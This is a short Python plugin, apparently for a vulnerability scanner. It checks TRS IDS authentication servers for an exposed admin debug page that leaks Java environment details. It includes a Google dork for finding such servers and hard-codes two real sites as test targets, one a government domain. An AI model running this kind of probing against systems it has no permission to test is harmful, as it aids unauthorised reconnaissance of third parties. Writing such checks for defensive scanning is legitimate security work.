#!usr/bin/env python
# *-* coding:utf-8 *-*

'''
name: TRS IDS身份认证系统信息泄露
author: yichin
refer: http://www.wooyun.org/bugs/wooyun-2013-039729
description:
    google dork: intitle:trs身份 / intitle:trs+inurl:ids
'''

def assign(service, arg):
    if service == 'trs_ids':
        return True, arg

def audit(arg):
    url = arg + 'ids/admin/debug/env.jsp'
    code, head, res, err, _ = curl.curl2(url)
    #print code, res
    if(code == 200) and ('JavaHome' in res) and 'java.runtime.name' in res and 'java.vm.version' in res:
        security_info('Info Disclosure: ' + url)
    
if __name__ == '__main__':
    from dummy import *
    audit(assign('trs_ids', 'http://hdpt.sxga.gov.cn/')[1])
    audit(assign('trs_ids', 'http://ids.am765.com/')[1])